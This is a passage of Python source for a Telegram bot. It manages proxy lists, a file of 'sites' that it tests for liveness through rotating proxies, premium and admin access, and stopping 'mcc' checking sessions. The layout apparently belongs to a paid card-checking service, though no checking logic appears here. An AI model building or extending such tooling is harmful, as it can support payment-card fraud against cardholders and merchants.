        await event.reply(premium_emoji(f"📋 All Proxies ({len(current_proxies)}):\n\nFile attached below."), file=filename, parse_mode='html')

        try:
            os.remove(filename)
        except:
            pass

@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ sites.txt is empty."), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking {len(sites)} sites..."), parse_mode='html')

    alive_sites = []
    dead_sites = []
    batch_size = 10

    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            fresh_proxies = load_proxies()
            if not fresh_proxies:
                fresh_proxies = proxies

            tasks = [test_site(site, random.choice(fresh_proxies)) for site in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])

            await status_msg.edit(premium_emoji(f"🔄 Checking sites...\n\nChecked: {len(alive_sites) + len(dead_sites)}/{len(sites)}\nAlive: {len(alive_sites)}\nDead: {len(dead_sites)}"), parse_mode='html')

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")

        await status_msg.edit(premium_emoji(f"✅ Site check complete!\n\nTotal: {len(sites)}\nAlive: {len(alive_sites)}\nRemoved: {len(dead_sites)}"), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rm\s+'))
async def remove_site_command(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    try:
        url_to_remove = event.message.text.split(' ', 1)[1].strip()
        if not url_to_remove:
            await event.reply(premium_emoji("❌ Usage: <code>/rm https://site.com</code>"), parse_mode='html')
            return

        current_sites = load_sites()

        if url_to_remove not in current_sites:
            await event.reply(premium_emoji(f"❌ Site not found: <code>{url_to_remove}</code>"), parse_mode='html')
            return

        new_sites = [site for site in current_sites if site != url_to_remove]

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in new_sites:
                await f.write(f"{site}\n")

        await event.reply(premium_emoji(f"✅ Site removed!\n\n<code>{url_to_remove}</code>"), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

        
@bot.on(events.NewMessage(pattern='/addsites'))
async def add_sites_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("📝 Please reply to a .txt file with the command:\n<code>/addsites</code>"), parse_mode='html')
        return
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji("🔄 Processing sites file..."), parse_mode='html')
    
    try:
        file_path = await reply_msg.download_media()
        
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
            sites = [line.strip() for line in content.splitlines() if line.strip()]
        
        os.remove(file_path)
        
        if not sites:
            await status_msg.edit(premium_emoji("❌ No valid sites found in file."), parse_mode='html')
            return
        
        await status_msg.edit(premium_emoji(f"🔄 Checking {len(sites)} sites before adding..."), parse_mode='html')
        
        proxies = load_proxies()
        if not proxies:
            await status_msg.edit(premium_emoji("❌ No proxies available to test sites."), parse_mode='html')
            return
        
        alive_sites = []
        dead_sites = []
        batch_size = 10
        
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            tasks = [test_site(site, random.choice(proxies)) for site in batch]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])
            
            await status_msg.edit(premium_emoji(f"🔄 Checking sites...\n\nChecked: {len(alive_sites) + len(dead_sites)}/{len(sites)}\n✅ Alive: {len(alive_sites)}\n❌ Dead: {len(dead_sites)}"), parse_mode='html')
        
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")
        
        result_text = f"""✅ <b>Sites updated successfully!</b>

📊 Total sites received: {len(sites)}
✅ Alive (added): {len(alive_sites)}
❌ Dead (ignored): {len(dead_sites)}

🌐 <b>Added sites:</b>
{chr(10).join([f"• {s}" for s in alive_sites[:5]])}{'...' if len(alive_sites) > 5 else ''}"""

        await status_msg.edit(premium_emoji(result_text), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
        
        
@bot.on(events.NewMessage(pattern='/addpremium'))
async def add_premium_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return
    
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            await event.reply(premium_emoji("📝 Usage: <code>/addpremium user_id</code>"), parse_mode='html')
            return
        
        target_id = int(parts[1])
        
        if await add_premium_user(target_id):
            await event.reply(premium_emoji(f"✅ User <code>{target_id}</code> added to premium!"), parse_mode='html')
            try:
                await bot.send_message(target_id, premium_emoji("🎉 Congratulations! You have been granted premium access to the bot!"), parse_mode='html')
            except:
                pass
        else:
            await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> is already premium."), parse_mode='html')
    
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid user ID."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/removepremium'))
async def remove_premium_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return
    
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            await event.reply(premium_emoji("📝 Usage: <code>/removepremium user_id</code>"), parse_mode='html')
            return
        
        target_id = int(parts[1])
        
        if target_id in ADMIN_ID:
            await event.reply(premium_emoji("⚠️ Cannot remove admin from premium."), parse_mode='html')
            return
        
        if await remove_premium_user(target_id):
            await event.reply(premium_emoji(f"✅ User <code>{target_id}</code> removed from premium."), parse_mode='html')
            try:
                await bot.send_message(target_id, premium_emoji("⚠️ Your premium access has been revoked."), parse_mode='html')
            except:
                pass
        else:
            await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> is not premium."), parse_mode='html')
    
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid user ID."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/listpremium'))
async def list_premium_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return
    
    premium_users = load_premium_users()
    
    if not premium_users:
        await event.reply(premium_emoji("📭 No premium users found."), parse_mode='html')
        return
    
    premium_list = "\n".join([f"• <code>{uid}</code>" for uid in premium_users])
    
    await event.reply(premium_emoji(f"👑 <b>Premium Users ({len(premium_users)})</b>\n\n{premium_list}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return
    
    premium_users = load_premium_users()
    sites = load_sites()
    proxies = load_proxies()
    
    stats_text = f"""📊 <b>Bot Statistics</b>

👑 <b>Admins:</b> {len(ADMIN_ID)}
💎 <b>Premium Users:</b> {len(premium_users)}
🌐 <b>Sites:</b> {len(sites)}
🔌 <b>Proxies:</b> {len(proxies)}

🤖 <b>Bot Status:</b> Running ✅"""
    
    await event.reply(premium_emoji(stats_text), parse_mode='html')


# ========== /getsites command ==========
@bot.on(events.NewMessage(pattern='/getsites'))
async def get_all_sites(event):
    user_id = event.sender_id

    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    current_sites = load_sites()

    if not current_sites:
        await event.reply(premium_emoji("❌ No sites in sites.txt"), parse_mode='html')
        return

    # Group by domain
    groups = {}
    for site in current_sites:
        domain = site.replace('https://', '').replace('http://', '').split('/')[0]
        parts = domain.split('.')
        key = parts[-2] if len(parts) >= 2 else domain
        groups.setdefault(key, []).append(site)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"sites_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write(f"🌐 AFUONA SITES LIST\n")
        await f.write(f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        await f.write(f"📊 Total Sites: {len(current_sites)}\n")
        await f.write(f"📦 Domains: {len(groups)}\n")
        await f.write("═" * 50 + "\n\n")

        for domain, sites in sorted(groups.items()):
            await f.write(f"🔹 [{domain.upper()}] — {len(sites)} sites\n")
            await f.write("─" * 40 + "\n")
            for i, site in enumerate(sites, 1):
                await f.write(f"  {i}. {site}\n")
            await f.write("\n")

    await event.reply(
        premium_emoji(f"📋 <b>Sites Exported!</b>\n\n📊 Total: <b>{len(current_sites)}</b>\n📦 Domains: <b>{len(groups)}</b>"),
        file=filename,
        parse_mode='html'
    )

    try:
        os.remove(filename)
    except Exception:
        pass


@bot.on(events.CallbackQuery(pattern=rb"stop_mcc_(\d+)_(\d+)"))
async def stop_mcc_handler(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())
    message_id = int(match.group(2).decode())
    session_key = f"mcc_{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer("🛑 Stopped", alert=True)
        try:
            await event.edit(premium_emoji("🛑 Checking stopped by user."), parse_mode='html')
        except:
            pass

print("✅ Bot started successfully!")
bot.run_until_disconnected()
